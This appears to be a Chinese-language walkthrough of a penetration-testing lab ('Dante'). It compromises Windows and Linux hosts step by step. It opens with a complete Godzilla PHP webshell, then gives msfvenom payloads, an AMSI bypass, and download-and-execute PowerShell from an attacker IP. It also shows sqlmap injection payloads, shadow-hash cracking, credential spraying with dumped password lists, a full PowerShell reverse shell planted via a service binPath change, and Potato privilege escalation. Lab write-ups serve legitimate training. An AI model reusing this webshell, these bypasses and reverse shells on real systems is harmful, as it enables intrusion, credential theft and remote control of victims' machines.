&lt;?php @session_start(); @set_time_limit(0); @error_rfsting(0); function encode($D,$K){ for($i=0;$i&lt;strlen($D);$i++) { $c = $K[$i+1&amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $pass='pass'; $payloadName='payload'; $key='3c6e0b8a9c15224a'; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 得到 webshell 后可以在 C:\Users\gerald\Desktop 下找到 flag.txt Godzilla 中直接反弹 msf meterpreter 会断掉，生成一个 msf windows https 载荷。 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=8443 -f exe -o wintest.txt msfconsole 中执行： set payload payload/windows/x64/meterpreter/reverse_https set LPOrt 8443 set exitonsession false exploit -j 在 webshell 中用 wget 下载载荷。 powershell wget http://10.10.14.5:9999/wintest.txt -o test.exe 执行后可以得到 meterpreter。 提权信息收集: winPEAS 远程加载 PowerSharpPack.ps1 iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/PowerSharpPack.ps1') 加载时返回下面的报错，应该是没有绕过 AMSI。 This script contains malicious content and has been blocked by your antivirus software. 绕过 AMSI： $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344) (new-object system.net.webclient).downloadstring('http://10.10.14.5:9999/amsi_rmouse.txt')|IEX 再次加载 PowerSharpPack.ps1 iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/PowerSharpPack.ps1') 执行 winPEAS 组件： PowerSharpPack -winPEAS 执行之后可以得到大量的输出。 存在历史漏洞 CVE-2019-1385、CVE-2019-1405 [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson) OS Build Number: 18363 [!] CVE-2019-1385 : VULNERABLE [&gt;] https://www.youtube.com/watch?v=K6gHnr-VkAg [!] CVE-2019-1405 : VULNERABLE [&gt;] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/ Interesting Services -non Microsoft Druva OpenSSH DLL 劫持路径 C:\WINDOWS\system32 C:\WINDOWS C:\WINDOWS\System32\Wbem C:\WINDOWS\System32\WindowsPowerShell\v1.0\ C:\WINDOWS\System32\OpenSSH\ 提权：CVE-2019-1405(未成功) 当 Windows 通用即插即用 (UPnP) 服务不正确地允许 COM 对象创建时，就会存在权限提升漏洞，因此该漏洞也被称为”Windows UPnP 服务权限提升漏洞”。 Exp https://github.com/apt69/COMahawk https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2019-1405 上传 exp，执行后未成功。 漏洞服务提权（Druva） winPEAS 对非 Microsoft 的服务进行扫描时，扫描出了一个 Druva 服务。 msf 搜索 Druva 可以得到一个提权 exp。 exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc Druva 的版本信息可以通过查看 licence.txt 文件获取。 type "c:\Program Files (x86)\Druva\inSync\licence.txt" Druva InSync 6.6.3 Copyright (c) 2019 Druva Inc. 6.6.3 版本也在 exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc 的利用范围内。 利用后可以得到 SYSTEM 权限。 msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) &gt; set LHOST 10.10.14.5 LHOST =&gt; 10.10.14.5 msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) &gt; set LPORT 5555 msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) &gt; set session 39 session =&gt; 39 msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) &gt; exploit [*] Started reverse TCP handler on 10.10.14.5:5555 [*] Running automatic check ("set AutoCheck false" to disable) [!] The service is running, but could not be validated. Service 'inSyncCPHService' exists. [*] Connecting to 127.0.0.1:6064 ... [*] Sending packet (260 bytes) to 127.0.0.1:6064 ... [*] Sending stage (175686 bytes) to 10.10.110.3 [*] Meterpreter session 41 opened (10.10.14.5:5555 -&gt; 10.10.110.3:21927) at 2023-12-26 20:01:51 -0500 meterpreter &gt; Linux: 172.16.1.12 开放端口： 172.16.1.12 21 172.16.1.12 80 172.16.1.12 22 172.16.1.12 443 172.16.1.12 3306 80 端口 SQL 注入 80 端口也是一个 xampp 服务，与 172.16.1.13 的版本基本一致。 python /webtools/dirscan/dirsearch/dirsearch.py -u http://172.16.1.12 -e php -p socks5://localhost:1080 -w /webtools/dicts/SecLists/Discovery/Web-Content/common.txt [20:11:05] Starting: [20:11:27] 301 - 232B - /blog -&gt; http://172.16.1.12/blog/ [20:11:31] 403 - 1KB - /cgi-bin/ [20:11:37] 301 - 237B - /dashboard -&gt; http://172.16.1.12/dashboard/ [20:11:47] 200 - 30KB - /favicon.ico [20:11:56] 301 - 231B - /img -&gt; http://172.16.1.12/img/ [20:12:17] 403 - 1KB - /phpmyadmin [20:12:48] 301 - 237B - /webalizer -&gt; http://172.16.1.12/webalizer/ 扫描到一个 /blog 目录。 根据博客的 footer 信息：Responsive Blog Site 2023 - Brought To You by Ser Bermz 可以找到该 CMS 的相关信息：https://www.youtube.com/channel/UCsFgC9ggwrmYR2XqEHXpbNg 进一步定位到源码：[Responsive Online Blog Website Using PHP/MySQL CampCodes](https://www.campcodes.com/projects/php/responsive-online-blog-website-using-php-mysql-free-download/) 在 exploitdb 中可以查询到该 CMS 的历史漏洞 Responsive Online Blog 1.0 - ‘id’ SQL Injection - PHP webapps Exploit POC: sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs --batch --proxy socks5://localhost:1080 枚举出所有的数据库 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 202 HTTP(s) requests: --- Parameter: id (GET) Type: boolean-based blind Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause Payload: id=1' RLIKE (SELECT (CASE WHEN (1163=1163) THEN 1 ELSE 0x28 END))-- mDDs Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1' AND (SELECT 3351 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(3351=3351,1))),0x71706b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- QmkZ Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id=1' AND (SELECT 5794 FROM (SELECT(SLEEP(5)))qeMR)-- MjCh Type: UNION query Title: MySQL UNION query (NULL) - 2 columns Payload: id=-4778' UNION ALL SELECT NULL,CONCAT(0x7176626a71,0x50687146794d544756786254455a6153556a736c776e696c6e77516c78476a454c636c727474756d,0x71706b6a71)# --- [20:46:01] [INFO] the back-end DBMS is MySQL web application technology: PHP 7.4.7, Apache 2.4.43 back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork) [20:46:03] [INFO] fetching database names [20:46:06] [INFO] retrieved: 'information_schema' [20:46:07] [INFO] retrieved: 'test' [20:46:08] [INFO] retrieved: 'performance_schema' [20:46:09] [INFO] retrieved: 'flag' [20:46:10] [INFO] retrieved: 'mysql' [20:46:11] [INFO] retrieved: 'blog_admin_db' [20:46:12] [INFO] retrieved: 'phpmyadmin' available databases [7]: [*] blog_admin_db [*] flag [*] information_schema [*] mysql [*] performance_schema [*] phpmyadmin [*] test 逐步获取 flag 数据库中的字段。 sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs --batch --proxy socks5://localhost:1080 -D flag -T flag -C flag --dump [20:48:28] [INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'flag' Database: flag Table: flag [1 entry] +------------------------------+ | flag | +------------------------------+ | DANTE{wHy_y0U_n0_s3cURe?!?!} | +------------------------------+ 使用 –os-shell 无法写入 webshell，可能是没有写权限，无法成功。 尝试在 blog_admin_db 中寻找一些敏感信息。枚举所有用户： sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch --proxy socks5://localhost:1080 --technique U -D blog_admin_db -T membership_users --dump 结果如下： admin 21232f297a57a5a743894a0e4a801fc3 (admin) egre55 d6501933a2e0ea1f497b87473051417f test 098f6bcd4621d373cade4e832627b4f6 (test) test1 739969b53246b2c727850dbb3490ede6 (test9) test2 ad0234829205b9033196ba818f7a872b (test2) memberID passMD5 ben 442179ad1de9c25593cabf625c0badb7 MD5 爆破（john） ben 用户的 hash 可以使用 john 进行爆破，得到密码: Welcometomyblog john --wordlist=/webtools/dicts/rockyou.txt md5hash --format=Raw-MD5 使用上面的凭证登陆 ssh，admin 用户得到 Permission denied，ben 用户可以成功登陆。 p -q ssh ben@172.16.1.12 使用 linPEAS 进行提权信息收集 # linPEAS nc -lvnp 9002 | tee linpeas.out #Host wget -q -O- 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 #Victim 提权: PwnKit linPEAS 扫描出较多提权漏洞: [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main [+] [CVE-2021-3156] sudo Baron Samedit Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: mint=19,[ ubuntu=18|20 ], debian=10 Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main [+] [CVE-2021-3156] sudo Baron Samedit 2 Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10 Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET) Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/ Exposure: less probable Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN) [+] [CVE-2022-2586] nft_object UAF Details: https://www.openwall.com/lists/oss-security/2022/08/29/5 Exposure: less probable Tags: ubuntu=(20.04){kernel:5.12.13} Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1 Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN) [+] [CVE-2021-22555] Netfilter heap out-of-bounds write Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html Exposure: less probable Tags: ubuntu=20.04{kernel:5.8.0-*} Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c Comments: ip_tables kernel module must be loaded [+] [CVE-2019-18634] sudo pwfeedback Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/ Exposure: less probable Tags: mint=19 Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c Comments: sudo configuration requires pwfeedback to be enabled. [+] [CVE-2017-0358] ntfs-3g-modprobe Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072 Exposure: less probable Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2} Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores. Pwnkit 可成功提权。 ben@DANTE-NIX04:~/.tmp$ ./.pw root@DANTE-NIX04:/home/ben/.tmp# 提权: sudo &lt; 1.8.28 sudo 版本为 1.8.27。 ben@DANTE-NIX04:~/.tmp$ sudo -V Sudo version 1.8.27 Sudoers policy plugin version 1.8.27 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.27 hacktricks 中记录了一个 sudo 版本小于 1.8.28 的 payload sudo -u#-1 /bin/bash 可以直接提权到 root ben@DANTE-NIX04:~/.tmp$ sudo -u#-1 /bin/bash root@DANTE-NIX04:/home/ben/.tmp# /etc/shadow 文件中包含了一个提示：CrackMe。 julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7::: 将 /etc/passwd 和 /etc/shadow 文件保存到本地，使用 unshadow 组合成一个文件，删除文件中的其他行，只留下 julian，最后使用 john 爆破。 unshadow 172.16.1.12_etc_passwd 172.16.1.12_shadowhash &gt; 172.16.1.12_unshadow john --wordlist=/webtools/dicts/rockyou.txt 172.16.1.12_unshadow 第一次爆破没有得到结果，但 john 提示我们使用参数 --format=md5crypt-long Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long" Use the "--format=md5crypt-long" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:00:19 DONE (2023-12-27 07:13) 0g/s 712123p/s 712123c/s 712123C/s !!!0mc3t..*7¡Vamos! Session completed. 指定新的加密方式后可以正常跑出明文为 manchesterunited john --wordlist=/webtools/dicts/rockyou.txt 172.16.1.12_unshadow --format=md5crypt-long Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status manchesterunited (julian) 1g 0:00:00:00 DONE (2023-12-27 07:17) 25.00g/s 70400p/s 70400c/s 70400C/s bebito..medicina Use the "--show" option to display all of the cracked passwords reliably Session completed. 至此我们掌握了多个用户凭证： julian/manchesterunited ben/Welcometomyblog balthazar/TheJoker12345! mrb3n/S3kur1ty2020! Admin_129834765/SamsungOctober102030 还有此前在 172.16.1.20 中获取到的 excel 表格。 asmith Princess1 smoggat Summer2019 tmodle P45678! ccraven Password1 kploty Teacher65 jbercov 4567Holiday1 whaguey acb123 dcamtan WorldOfWarcraft67 tspadly RopeBlackfieldForwardslash ematlis JuneJuly1TY fglacdon FinalFantasy7 tmentrso 65RedBalloons dharding WestminsterOrange5 smillar MarksAndSparks91 bjohnston Bullingdon1 iahmed Sheffield23 plongbottom PowerfixSaturdayClub777 jcarrot Tanenbaum0001 lgesley SuperStrongCantForget123456789 Linux: 172.16.1.101 172.16.1.101 21 172.16.1.101 135 172.16.1.101 139 172.16.1.101 445 FTP 爆破 172.16.1.101 的 ftp 不允许匿名登陆，并且 FileZilla Server 0.9.60 beta 不存在可用的 exp。 借助此前获取的用户名密码，我们可以爆破 ftp，首先将用户名保存在 users.txt 密码保存在 password.txt 中。然后运行 hydra。 export HYDRA_PROXY=socks5://localhost:1080 hydra -L users.txt -P password.txt 172.16.1.101 ftp -V 默认情况下 hydra 会对单个用户名尝试所有的密码，为了加快速度，我们可以使用 combine 模式来将用户名密码一一对应。先将用户名密码以 : 切分写在单个文件中。 asmith:Princess1 smoggat:Summer2019 tmodle:P45678! ccraven:Password1 kploty:Teacher65 jbercov:4567Holiday1 whaguey:acb123 dcamtan:WorldOfWarcraft67 tspadly:RopeBlackfieldForwardslash ematlis:JuneJuly1TY fglacdon:FinalFantasy7 tmentrso:65RedBalloons dharding:WestminsterOrange5 smillar:MarksAndSparks91 bjohnston:Bullingdon1 iahmed:Sheffield23 plongbottom:PowerfixSaturdayClub777 jcarrot:Tanenbaum0001 lgesley:SuperStrongCantForget123456789 julian:manchesterunited ben:Welcometomyblog balthazar:TheJoker12345! mrb3n:S3kur1ty2020! Admin_129834765:SamsungOctober102030 然后 hydra 爆破时使用 -C 参数。 export HYDRA_PROXY=socks5://localhost:1080 hydra -C combine.txt 172.16.1.101 ftp -V 很快就能够得到结果，dharding/WestminsterOrange5 可以正常登陆 [21][ftp] host: 172.16.1.101 login: dharding password: WestminsterOrange5 登陆之后获取到 Remote login.txt Dido, I've had to change your account password due to some security issues we have recently become aware of It's similar to your FTP password, but with a different number (ie. not 5!) Come and see me in person to retrieve your password. thanks, James 从提示中可以看出该用户远程登陆的密码与 FTP 密码相同但最后一个数字不是 5。因此我们可以构造一个密码字典来进行爆破。 SMB 爆破 这台主机没有 ssh,也没有开放 3389 端口，但可以尝试用 smb 来验证密码是否正确。 cme 或者 nxc 集成了 SMB 爆破的功能。 p -q crackmapexec smb 172.16.1.101 -u users.txt -p password.txt 尝试到 WestminsterOrange17 时成功登陆。 SMB 172.16.1.101 445 DANTE-WS02 [*] Windows 10.0 Build 18362 x64 (name:DANTE-WS02) (domain:DANTE-WS02) (signing:False) (SMBv1:False) SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange0 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange1 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange2 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange3 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange4 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange6 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange7 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange8 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange9 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange10 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange11 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange12 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange13 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange14 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange15 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [-] DANTE-WS02\dharding:WestminsterOrange16 STATUS_LOGON_FAILURE SMB 172.16.1.101 445 DANTE-WS02 [+] DANTE-WS02\dharding:WestminsterOrange17 WinRM 远程登陆 172.16.1.101 实际上开放了 5985 端口，此前使用 fscan 扫描时没有扫到的原因在于，fscan 默认扫描端口：”21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017” goby 企业端口列表中也没有 5985： 21,22,23,25,53,U:53,U:69,80,81,U:88,110,111,U:111,123,U:123,135,U:137,139,U:161,U:177,389,U:427,443,445,465,500,515,U:520,U:523,548,623,U:626,636,873,902,1080,1099,1433,U:1434,1521,U:1604,U:1645,U:1701,1883,U:1900,2049,2181,2375,2379,U:2425,3128,3306,3389,4730,U:5060,5222,U:5351,U:5353,5432,5555,5601,5672,U:5683,5900,5938,5984,6000,6379,7001,7077,8080,8081,8443,8545,8686,9000,9001,9042,9092,9100,9200,9418,9999,11211,U:11211,27017,U:33848,37777,50000,50070,61616 以后使用 fscan 扫描时可以使用 goby 内置的常用端口列表： fscan -h 172.16.1.0/24 -socks5 127.0.0.1:1080 -p "1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,873,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2082,2083,2100,2103,2121,2199,2207,2222,2323,2362,2375,2380-2381,2525,2533,2598,2601,2604,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3311,3312,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5601,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6082,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9060,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9443,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535" -nobr -nopoc 5985 端口可以使用 evil-winrm 进行连接。 p -q evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17 登陆之后可以查看 dharding 用户的 flag.txt 提权: 服务 ACL 配置错误 dharding Desktop 目录中有一个 qc 文件，内容为 IObitUnSvr。 使用 evil-winrm 加载 winPEAS。（evil-winrm 加载 ps 脚本的速度比较慢） p -q evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17 -s /webtools/movement/PowerSharpPack/PowerSharpBinaries Bypass-4MSI Invoke-winPEAS.ps1 Invoke-winPEAS 关注非微软程序或服务，可以看到有一个 IObit Uninstaller。 ╔══════════╣ Scheduled Applications --Non Microsoft-- ╚ Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries (dharding) Uninstaller_SkipUac_dharding: C:\Program Files (x86)\IObit\IObit Uninstaller\IObitUninstaler.exe /UninstallExplorer 查询 exploitdb 可以发现该应用存在历史漏洞： ----------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------- --------------------------------- IObit Uninstaller 10 Pro - Unquoted Service Path | windows/local/49371.txt IObit Uninstaller 9.1.0.8 - 'IObitUnSvr' Unquoted Service Path | windows/local/47538.txt IObit Uninstaller 9.5.0.15 - 'IObit Uninstaller Service' Unquoted Service Path | windows/local/48543.txt ----------------------------------------------------------------------------------------------------------------- --------------------------- 目录下的 History.txt 包含了版本信息，版本为 9.5，存在 Unquoted Service Path 提权漏洞。该漏洞的利用需要在 C:\Program Files (x86)\IObit 写入恶意的 IObit.exe，但该路径没有写入权限。 icacls . . NT SERVICE\TrustedInstaller:(I)(F) NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F) NT AUTHORITY\SYSTEM:(I)(F) NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F) BUILTIN\Administrators:(I)(F) BUILTIN\Administrators:(I)(OI)(CI)(IO)(F) BUILTIN\Users:(I)(RX) BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE) CREATOR OWNER:(I)(OI)(CI)(IO)(F) APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE) APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE) 通过 Get-ServiceAcl.ps1 查看 IObitUnSvr 服务的 ACL 时，发现 dharding 具备 ChangeConfig 权限，可以更改配置。 *Evil-WinRM* PS C:\Users\dharding\Documents&gt; Get-ServiceAcl.ps1 *Evil-WinRM* PS C:\Users\dharding\Documents&gt; "IObitUnSvr" | Get-ServiceAcl | select -ExpandProperty Access ServiceRights : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl AccessControlType : AccessAllowed IdentityReference : DANTE-WS02\dharding IsInherited : False InheritanceFlags : None PropagationFlags : None 因此只需要更改服务的 binPath，然后重启服务即可提权。 首先准备一个反弹 shell 的 bat 脚本：runme.bat @echo off start /b powershell.exe -exec bypass -enc &lt;base64_encoded_payload&gt; exit /b 其中的 base64_encoded_payload 原始 payload 如下： $client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 使用 UTF-16LE 和 base64 编码后进行填充写入 runme.bat 将 runme.bat 下载到 c:\temp 下。 mkdir c:\temp cd c:\temp (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:9999/runme.bat','c:\temp\runme.bat') 本地监听 9001： nc -lvp 9001 接着在目标中更改 IObitUnSvr 的配置。 sc.exe stop IObitUnSvr sc.exe config IObitUnSvr binPath="cmd.exe /c c:\temp\runme.bat" sc.exe qc IObitUnSvr sc.exe start IObitUnSvr 启动 IObitUnSvr 可以接收到 shell。 Directory: C:\Users\Administrator\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 08/01/2021 05:34 33 flag.txt -a---- 14/07/2020 03:18 1417 Microsoft Edge.lnk PS C:\Users\Administrator\Desktop&gt; cat flag.txt DANTE{Qu0t3_I_4M_secure!_unQu0t3} Windows: 172.16.1.102 开放端口： 5985,135,445,3389,139,3306,443,47001,80,5040 80/443: Online Marriage Registration System 47001: Microsoft-HTTPAPI/2.0 80 端口文件上传漏洞 80 端口部署了一个 Online Marriage Registration System。exploitdb 可以搜索到相关的 exp： https://www.exploit-db.com/exploits/49557 首先上传 nc p -q python /webtools/exploit/OMRS/exp.py -u http://172.16.1.102/ -c 'powershell.exe wget 10.10.14.5:9999/nc.exe -O nc.exe' 然后使用 nc 反弹 shell。 p -q python /webtools/exploit/OMRS/exp.py -u http://172.16.1.102/ -c 'nc.exe -e powershell.exe 10.10.14.5 9001' 获取到 dante-ws03\blake 权限后可读取用户 flag.txt 提权: BadPotato 首先使用 winPEAS 收集信息，可以将结果写到文件，然后拖回来分析。 iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-winPEAS.ps1') Invoke-winPEAS &gt;&gt; .out dante-ws03\blake 具备 SeImpersonatePrivilege 权限，可以使用 Potato 家族进行提权。 SeShutdownPrivilege: DISABLED SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeUndockPrivilege: DISABLED SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED SeIncreaseWorkingSetPrivilege: DISABLED SeTimeZonePrivilege: DISABLED BadPotato 是 SweetPotato 的 C# 版本，PowerSharpPack 中已经集成了 BadPotato 的 powershell 版本。 mkdir c:\temp cd c:\temp (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:9999/runme.bat','c:\temp\runme.bat') iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-BadPotato.ps1') Invoke-BadPotato -Command "c:\temp\runme.bat" 但执行之后无法成功，直接通过 whoami /priv 显示 Access is denied。 执行 msf 载荷，获取到一个 meterpreter 之后再进入 powershell 就可以成功提权了。 PS C:\temp&gt; Invoke-BadPotato -Command "whoami" Invoke-BadPotato -Command "whoami" [*] ____ ______ __ __ / __ )____ _____/ / __ \____ / /_____ _/ /_____ / __ / __ `/ __ / /_/ / __ \/ __/ __ `/ __/ __ \ / 